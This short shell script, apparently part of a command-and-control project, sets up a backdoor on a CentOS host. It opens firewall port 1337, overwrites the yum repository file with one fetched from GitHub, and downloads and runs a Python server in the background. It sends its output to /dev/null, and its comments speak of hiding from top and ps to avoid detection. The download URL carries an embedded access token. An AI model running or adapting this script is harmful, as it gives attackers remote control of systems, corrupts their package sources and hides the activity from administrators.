# download the CentOS-Base.repo file and overwrite the current
# /etc/yum.repos.d/CentOS-Base.repo

#{ these brackets will hide the result of the code
# -lic runs the commands in a new shell that also closes - the goal is to run the python in this so that it won't close

# opens firewall to 1337 :)
sudo strace -o /dev/null /bin/sh -lic "iptables -A IN_public_allow -p tcp -m tcp --dport 1337 -m conntrack --ctstate NEW,UNTRACKED -j ACCEPT;
curl https://raw.githubusercontent.com/Rohit-Anantha/C2/refs/heads/main/CentOS-Base.repo > /etc/yum.repos.d/CentOS-Base.repo;
yum clean all;
yum install -y python3;
curl https://raw.githubusercontent.com/Rohit-Anantha/C2/refs/heads/main/server_code.py?token=GHSAT0AAAAAACWVPCAE3GODF5BMBMBMRDCIZYZDWOQ > server_code.py
python3 server_code.py &
"


#} &> /dev/null

# hide top and ps to avoid detection

# download the server executable

# wait for completion then run



# curl https://raw.githubusercontent.com/Rohit-Anantha/C2/refs/heads/main/CentOS-Base.repo > ./etc/yum.repos.d/CentOS-Base.repo;
# yum clean all;